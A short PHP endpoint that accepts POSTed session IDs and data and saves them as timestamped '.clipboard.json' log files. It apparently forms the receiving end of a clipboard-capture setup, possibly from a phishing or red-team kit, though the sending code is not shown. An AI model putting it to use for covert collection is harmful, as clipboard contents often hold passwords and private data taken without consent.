<?php
header('Content-Type: text/html');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit('Method Not Allowed');
}

$raw_sid = isset($_POST['Sid']) ? $_POST['Sid'] : 'unknown';
$sid = preg_replace('/[^a-zA-Z0-9_\-]/', '', substr($raw_sid, 0, 64));

$data = isset($_POST['Data']) ? substr($_POST['Data'], 0, 16384) : '';
$timestamp = date('Y-m-d H:i:s');

$entry = array(
    'data' => $data,
    'timestamp' => $timestamp,
    'sid' => $sid
);

$json_data = json_encode($entry);
$f = fopen('../../logs/' . $sid . '.' . round(microtime(true) * 1000) . '.clipboard.json', 'w+');
fwrite($f, $json_data);
fclose($f);
